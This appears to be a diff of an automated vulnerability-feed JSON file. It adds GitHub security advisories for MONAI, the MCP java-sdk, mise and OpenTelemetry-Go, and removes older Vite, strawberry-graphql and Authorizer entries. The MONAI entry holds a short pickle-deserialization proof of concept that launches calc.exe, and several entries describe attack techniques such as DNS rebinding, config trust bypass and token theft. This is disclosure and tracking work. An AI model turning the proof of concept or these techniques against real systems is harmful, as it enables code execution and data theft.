@@ -1,5 +1,5 @@
 {
-  "timestamp": "2026-04-07T18:35:19.806643+00:00",
+  "timestamp": "2026-04-07T22:22:22.038512+00:00",
   "sources_polled": [
     "cisa-kev",
     "ransomware.live",
@@ -279,6 +279,124 @@
   ],
   "github_advisories": [
     {
+      "ghsa_id": "GHSA-89gg-p5r5-q6r4",
+      "cve_id": null,
+      "severity": "HIGH",
+      "summary": "MONAI: Unsafe functions lead to pickle deserialization rce",
+      "description": "### Summary\nThe `algo_from_pickle` function in `monai/auto3dseg/utils.py` causes `pickle.loads(data_bytes)` to be executed, and it does not perform any validation on the input parameters. This ultimately leads to insecure deserialization and can result in code execution vulnerabilities.\n\n### Details\npoc\n```\nimport pickle\nimport subprocess\nclass MaliciousAlgo:\n    def __reduce__(self):\n        return (subprocess.call, (['calc.exe'],))\nmalicious_algo_bytes = pickle.dumps(MaliciousAlgo())\n\nattack_data = {\n    \"algo_bytes\": malicious_algo_bytes,  \n     \n}\nattack_pickle_file = \"attack_algo.pkl\"\nwith open(attack_pickle_file, \"wb\") as f:\n    f.write(pickle.dumps(attack_data))\n\n```\nGenerate the malicious file \"attack_algo.pkl\" through POC.\n\n```\nfrom monai.auto3dseg.utils import algo_from_pickle\n\n\nattack_pickle_file = \"attack_algo.pkl\"\nresult = algo_from_pickle(attack_pickle_file)\n```\nUltimately, it will trigger pickle.load through a file to identify the command execution.\n\n<img width=\"909\" hei",
+      "cvss_score": 7.7,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H",
+      "epss_score": null,
+      "cwe_ids": [
+        "CWE-502"
+      ],
+      "ecosystems": [
+        "pip"
+      ],
+      "packages": [
+        "monai"
+      ],
+      "published": "2026-04-07T20:17:21Z",
+      "updated": "2026-04-07T20:17:25Z",
+      "url": "https://github.com/advisories/GHSA-89gg-p5r5-q6r4",
+      "source": "github-advisory",
+      "poc_urls": [
+        "https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-89gg-p5r5-q6r4",
+        "https://github.com/Project-MONAI/MONAI/releases/tag/1.5.2",
+        "https://github.com/advisories/GHSA-89gg-p5r5-q6r4"
+      ]
+    },
+    {
+      "ghsa_id": "GHSA-8jxr-pr72-r468",
+      "cve_id": "CVE-2026-35568",
+      "severity": "HIGH",
+      "summary": "Java-SDK has a DNS Rebinding Vulnerability",
+      "description": "### Summary\n\nThe java-sdk contains a DNS rebinding vulnerability. This vulnerability allows an attacker to access a locally or network-private java-sdk MCP server via a victims browser that is either local, or network adjacent.\n\nThis allows an attacker to make any tool call to the server as if they were a locally running MCP connected AI agent.\n\n### Details\n\nPrior to 1.0.0 no Origin header validation was occurring, in violation of the MCP specification. [Base Protocol > Transports: 2.0.1 Security Warning](https://modelcontextprotocol.io/specification/2025-06-18/basic/transports#security-warning):\n\n> 1: Servers MUST validate the Origin header on all incoming connections to prevent DNS rebinding attacks.\n\nWhen the web server serving HTTP traffic to the MCP server does not perform standard CORS checks, a DNS rebinding attack is possible.\n\nSome default server configurations and frameworks come with embedded `Origin` header validation. MCP servers built using those are not vulnerable to thi",
+      "cvss_score": null,
+      "cvss_vector": null,
+      "epss_score": null,
+      "cwe_ids": [
+        "CWE-346"
+      ],
+      "ecosystems": [
+        "maven"
+      ],
+      "packages": [
+        "io.modelcontextprotocol.sdk:mcp-core"
+      ],
+      "published": "2026-04-07T20:13:32Z",
+      "updated": "2026-04-07T20:13:33Z",
+      "url": "https://github.com/advisories/GHSA-8jxr-pr72-r468",
+      "source": "github-advisory",
+      "poc_urls": [
+        "https://github.com/modelcontextprotocol/java-sdk/security/advisories/GHSA-8jxr-pr72-r468",
+        "https://github.com/modelcontextprotocol/java-sdk/releases/tag/v1.0.0",
+        "https://github.com/advisories/GHSA-8jxr-pr72-r468"
+      ]
+    },
+    {
+      "ghsa_id": "GHSA-436v-8fw5-4mj8",
+      "cve_id": "CVE-2026-35533",
+      "severity": "HIGH",
+      "summary": "Local settings bypass config trust checks",
+      "description": "### Summary\n\n`mise` loads trust-control settings from a local project `.mise.toml` before the trust check runs. An attacker who can place a malicious `.mise.toml` in a repository can make that same file appear trusted and then reach dangerous directives such as `[env] _.source`, templates, hooks, or tasks.\n\nThe strongest current variant is `trusted_config_paths = [\"/\"]`. I confirmed on current `v2026.3.17` in Docker that this causes an untrusted project config to become trusted during `mise hook-env`, which then executes an attacker-controlled `_.source` script. The same preload issue also lets local `yes = true` / `ci = true` auto-approve trust prompts on `v2026.2.18+`, but the primary PoC below uses the stronger `trusted_config_paths` path.\n\n### Details\n\nThe vulnerable load order is:\n\n1. [`Settings::try_get()`](https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/settings.rs#L254-L283) preloads local settings files.\n2. [`parse_settings_file()`](https:/",
+      "cvss_score": 7.8,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H",
+      "epss_score": null,
+      "cwe_ids": [
+        "CWE-284"
+      ],
+      "ecosystems": [
+        "rust"
+      ],
+      "packages": [
+        "mise"
+      ],
+      "published": "2026-04-07T20:13:11Z",
+      "updated": "2026-04-07T22:16:56Z",
+      "url": "https://github.com/advisories/GHSA-436v-8fw5-4mj8",
+      "source": "github-advisory",
+      "poc_urls": [
+        "https://github.com/jdx/mise/security/advisories/GHSA-436v-8fw5-4mj8",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-35533",
+        "https://github.com/advisories/GHSA-436v-8fw5-4mj8"
+      ]
+    },
+    {
+      "ghsa_id": "GHSA-mh2q-q3fh-2475",
+      "cve_id": "CVE-2026-29181",
+      "severity": "HIGH",
+      "summary": "OpenTelemetry-Go: multi-value `baggage` header extraction causes excessive allocations (remote dos amplification)",
+      "description": "multi-value `baggage:` header extraction parses each header field-value independently and aggregates members across values. this allows an attacker to amplify cpu and allocations by sending many `baggage:` header lines, even when each individual value is within the 8192-byte per-value parse limit.\n\n## severity\n\nHIGH (availability / remote request amplification)\n\n## relevant links\n\n- repository: https://github.com/open-telemetry/opentelemetry-go\n- pinned callsite: https://github.com/open-telemetry/opentelemetry-go/blob/1ee4a4126dbdd1bc79e9fae072fa488beffac52a/propagation/baggage.go#L58\n\n## vulnerability details\n\n**pins:** open-telemetry/opentelemetry-go@1ee4a4126dbdd1bc79e9fae072fa488beffac52a\n**as-of:** 2026-02-04\n**policy:** direct (no program scope provided)\n\n**callsite:** propagation/baggage.go:58 (`extractMultiBaggage`)\n**attacker control:** inbound HTTP request headers (many `baggage` field-values) \u2192 `propagation.HeaderCarrier.Values(\"baggage\")` \u2192 repeated `baggage.Parse` + member",
+      "cvss_score": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "epss_score": null,
+      "cwe_ids": [
+        "CWE-400",
+        "CWE-770"
+      ],
+      "ecosystems": [
+        "go",
+        "go"
+      ],
+      "packages": [
+        "go.opentelemetry.io/otel/baggage",
+        "go.opentelemetry.io/otel/propagation"
+      ],
+      "published": "2026-04-07T20:12:57Z",
+      "updated": "2026-04-07T22:16:41Z",
+      "url": "https://github.com/advisories/GHSA-mh2q-q3fh-2475",
+      "source": "github-advisory",
+      "poc_urls": [
+        "https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-mh2q-q3fh-2475",
+        "https://github.com/open-telemetry/opentelemetry-go/pull/7880",
+        "https://github.com/open-telemetry/opentelemetry-go/commit/aa1894e09e3fe66860c7885cb40f98901b35277f",
+        "https://github.com/open-telemetry/opentelemetry-go/releases/tag/v1.41.0",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-29181",
+        "https://github.com/advisories/GHSA-mh2q-q3fh-2475"
+      ]
+    },
+    {
       "ghsa_id": "GHSA-qmwh-9m9c-h36m",
       "cve_id": null,
       "severity": "HIGH",
@@ -455,12 +573,13 @@
         "PraisonAI"
       ],
       "published": "2026-04-06T23:09:19Z",
-      "updated": "2026-04-06T23:09:21Z",
+      "updated": "2026-04-07T22:10:15Z",
       "url": "https://github.com/advisories/GHSA-r9x3-wx45-2v7f",
       "source": "github-advisory",
       "poc_urls": [
         "https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-r9x3-wx45-2v7f",
         "https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.113",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-39308",
         "https://github.com/advisories/GHSA-r9x3-wx45-2v7f"
       ]
     },
@@ -483,12 +602,13 @@
         "PraisonAI"
       ],
       "published": "2026-04-06T23:09:12Z",
-      "updated": "2026-04-06T23:09:12Z",
+      "updated": "2026-04-07T22:10:10Z",
       "url": "https://github.com/advisories/GHSA-4rx4-4r3x-6534",
       "source": "github-advisory",
       "poc_urls": [
         "https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-4rx4-4r3x-6534",
         "https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.113",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-39306",
         "https://github.com/advisories/GHSA-4rx4-4r3x-6534"
       ]
     },
@@ -502,6 +622,7 @@
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H",
       "epss_score": null,
       "cwe_ids": [
+        "CWE-22",
         "CWE-23"
       ],
       "ecosystems": [
@@ -511,12 +632,13 @@
         "PraisonAI"
       ],
       "published": "2026-04-06T23:08:55Z",
-      "updated": "2026-04-06T23:08:56Z",
+      "updated": "2026-04-07T22:09:55Z",
       "url": "https://github.com/advisories/GHSA-4ph2-f6pf-79wv",
       "source": "github-advisory",
       "poc_urls": [
         "https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-4ph2-f6pf-79wv",
         "https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.113",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-39307",
         "https://github.com/advisories/GHSA-4ph2-f6pf-79wv"
       ]
     },
@@ -601,7 +723,7 @@
         "vite"
       ],
       "published": "2026-04-06T18:03:32Z",
-      "updated": "2026-04-07T14:18:17Z",
+      "updated": "2026-04-07T22:16:19Z",
       "url": "https://github.com/advisories/GHSA-v2wj-q39q-566r",
       "source": "github-advisory",
       "poc_urls": [
@@ -610,133 +732,8 @@
         "https://github.com/vitejs/vite/commit/a9a3df299378d9cbc5f069e3536a369f8188c8ff",
         "https://github.com/vitejs/vite/releases/tag/v7.3.2",
         "https://github.com/vitejs/vite/releases/tag/v8.0.5",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-39364",
         "https://github.com/advisories/GHSA-v2wj-q39q-566r"
-      ]
-    },
-    {
-      "ghsa_id": "GHSA-p9ff-h696-f583",
-      "cve_id": "CVE-2026-39363",
-      "severity": "HIGH",
-      "summary": "Vite Vulnerable to Arbitrary File Read via Vite Dev Server WebSocket",
-      "description": "### Summary\n\n[`server.fs`](https://vite.dev/config/server-options#server-fs-strict) check was not enforced to the `fetchModule` method that is exposed in Vite dev server's WebSocket. \n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- WebSocket is not disabled by `server.ws: false`\n\nArbitrary files on the server (development machine, CI environment, container, etc.) can be exposed.\n\n### Details\n\nIf it is possible to connect to the Vite dev server\u2019s WebSocket **without an `Origin` header**, an attacker can invoke `fetchModule` via the custom WebSocket event `vite:invoke` and combine `file://...` with `?raw` (or `?inline`) to retrieve the contents of arbitrary files on the server as a JavaScript string (e.g., `export default \"...\"`).\n\nThe access control enforced in the HTTP request path (such as `serv",
-      "cvss_score": null,
-      "cvss_vector": null,
-      "epss_score": null,
-      "cwe_ids": [
-        "CWE-200",
-        "CWE-306"
-      ],
-      "ecosystems": [
-        "npm",
-        "npm",
-        "npm"
-      ],
-      "packages": [
-        "vite",
-        "vite",
-        "vite"
-      ],
-      "published": "2026-04-06T18:03:24Z",
-      "updated": "2026-04-06T23:44:11Z",
-      "url": "https://github.com/advisories/GHSA-p9ff-h696-f583",
-      "source": "github-advisory",
-      "poc_urls": [
-        "https://github.com/vitejs/vite/security/advisories/GHSA-p9ff-h696-f583",
-        "https://github.com/vitejs/vite/pull/22159",
-        "https://github.com/vitejs/vite/commit/f02d9fde0b195afe3ea2944414186962fbbe41e0",
-        "https://github.com/vitejs/vite/releases/tag/v6.4.2",
-        "https://github.com/vitejs/vite/releases/tag/v7.3.2",
-        "https://github.com/vitejs/vite/releases/tag/v8.0.5",
-        "https://github.com/advisories/GHSA-p9ff-h696-f583"
-      ]
-    },
-    {
-      "ghsa_id": "GHSA-hv3w-m4g2-5x77",
-      "cve_id": "CVE-2026-35526",
-      "severity": "HIGH",
-      "summary": "strawberry-graphql: Denial of Service via unbounded WebSocket subscriptions",
-      "description": "Strawberry GraphQL's WebSocket subscription handlers for both the `graphql-transport-ws` and legacy `graphql-ws` protocols allocate an `asyncio.Task` and associated `Operation` object for every incoming subscribe message without enforcing any limit on the number of active subscriptions per connection.\n\nAn unauthenticated attacker can open a single WebSocket connection, send connection_init, and then flood subscribe messages with unique IDs. Each message unconditionally spawns a new `asyncio.Task` and async generator, causing linear memory growth and event loop saturation. This leads to server degradation or an OOM crash.",
-      "cvss_score": 7.5,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
-      "epss_score": null,
-      "cwe_ids": [
-        "CWE-400",
-        "CWE-770"
-      ],
-      "ecosystems": [
-        "pip"
-      ],
-      "packages": [
-        "strawberry-graphql"
-      ],
-      "published": "2026-04-06T18:00:29Z",
-      "updated": "2026-04-06T18:00:30Z",
-      "url": "https://github.com/advisories/GHSA-hv3w-m4g2-5x77",
-      "source": "github-advisory",
-      "poc_urls": [
-        "https://github.com/strawberry-graphql/strawberry/security/advisories/GHSA-hv3w-m4g2-5x77",
-        "https://github.com/strawberry-graphql/strawberry/commit/0977a4e6b41b7cfe3e9d8ba84a43458a2b0c54c2",
-        "https://github.com/strawberry-graphql/strawberry/releases/tag/0.312.3",
-        "https://github.com/advisories/GHSA-hv3w-m4g2-5x77"
-      ]
-    },
-    {
-      "ghsa_id": "GHSA-vpwc-v33q-mq89",
-      "cve_id": "CVE-2026-35523",
-      "severity": "HIGH",
-      "summary": "strawberry-graphql: Authentication bypass via legacy graphql-ws WebSocket subprotocol",
-      "description": "Strawberry up until version `0.312.3` is vulnerable to an authentication bypass on WebSocket subscription endpoints. The legacy graphql-ws subprotocol handler does not verify that a `connection_init` handshake has been completed before processing start (subscription) messages. This allows a remote attacker to skip the `on_ws_connect` authentication hook entirely by connecting with the graphql-ws subprotocol and sending a start message directly, without ever sending `connection_init`.\n\nThe graphql-transport-ws subprotocol handler is not affected, as it correctly gates subscription operations on a connection_acknowledged flag. However, both subprotocols are enabled by default in all framework integrations that support websockets, and the subprotocol is selected by the client via the Sec-WebSocket-Protocol header.\n\nAny application relying on `on_ws_connect` for authentication or authorization is affected.\n\nMitigation: Upgrade to the patched version, or explicitly disable the legacy graphq",
-      "cvss_score": 7.5,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
-      "epss_score": null,
-      "cwe_ids": [
-        "CWE-306"
-      ],
-      "ecosystems": [
-        "pip"
-      ],
-      "packages": [
-        "strawberry-graphql"
-      ],
-      "published": "2026-04-06T18:00:26Z",
-      "updated": "2026-04-06T18:00:27Z",
-      "url": "https://github.com/advisories/GHSA-vpwc-v33q-mq89",
-      "source": "github-advisory",
-      "poc_urls": [
-        "https://github.com/strawberry-graphql/strawberry/security/advisories/GHSA-vpwc-v33q-mq89",
-        "https://github.com/strawberry-graphql/strawberry/commit/0977a4e6b41b7cfe3e9d8ba84a43458a2b0c54c2",
-        "https://github.com/strawberry-graphql/strawberry/releases/tag/0.312.3",
-        "https://github.com/advisories/GHSA-vpwc-v33q-mq89"
-      ]
-    },
-    {
-      "ghsa_id": "GHSA-x3f4-v83f-7wp2",
-      "cve_id": null,
-      "severity": "HIGH",
-      "summary": "Authorizer: Password reset token theft and full auth token redirect via unvalidated redirect_uri",
-      "description": "Hi,\n\nI found that 6 endpoints in Authorizer accept a user-controlled `redirect_uri` and append sensitive tokens to it without validating the URL against `AllowedOrigins`. The OAuth `/app` handler validates redirect_uri at `http_handlers/app.go:46`, but the GraphQL mutations and verify_email handler skip validation entirely. An attacker can steal password reset tokens, magic link tokens, and full auth sessions (access_token + id_token + refresh_token) by pointing redirect_uri to their server. Verified against HEAD (commit 73679fa).\n\n## Affected Endpoints\n\n1. **ForgotPassword** (`internal/graphql/forgot_password.go:76-77`) - password reset tokens\n2. **MagicLinkLogin** (`internal/graphql/magic_link_login.go:150-151`) - magic link auth tokens\n3. **Signup** (`internal/graphql/signup.go:211-212`) - email verification tokens\n4. **InviteMembers** (`internal/graphql/invite_members.go:90-91`) - invitation tokens\n5. **OAuthLoginHandler** (`internal/http_handlers/oauth_login.go:18-20`) - OAuth red",
-      "cvss_score": null,
-      "cvss_vector": null,
-      "epss_score": null,
-      "cwe_ids": [
-        "CWE-601"
-      ],
-      "ecosystems": [
-        "go"
-      ],
-      "packages": [
-        "github.com/authorizerdev/authorizer"
-      ],
-      "published": "2026-04-06T17:59:27Z",
-      "updated": "2026-04-06T17:59:30Z",
-      "url": "https://github.com/advisories/GHSA-x3f4-v83f-7wp2",
-      "source": "github-advisory",
-      "poc_urls": [
-        "https://github.com/authorizerdev/authorizer/security/advisories/GHSA-x3f4-v83f-7wp2",
-        "https://github.com/authorizerdev/authorizer/pull/502",
-        "https://github.com/authorizerdev/authorizer/commit/6d9bef1aaba3f867f8c769b93eb7fc80e4e7b0a2",
-        "https://github.com/authorizerdev/authorizer/releases/tag/2.0.1",
-        "https://github.com/advisories/GHSA-x3f4-v83f-7wp2"
       ]
     }
   ],
@@ -785,7 +782,7 @@
         "count": 25
       }
     ],
-    "catalog_version": "2026-04-07T18:35:19.947757+00:00",
+    "catalog_version": "2026-04-07T22:22:22.319824+00:00",
     "source": "CISA KEV"
   }
 }
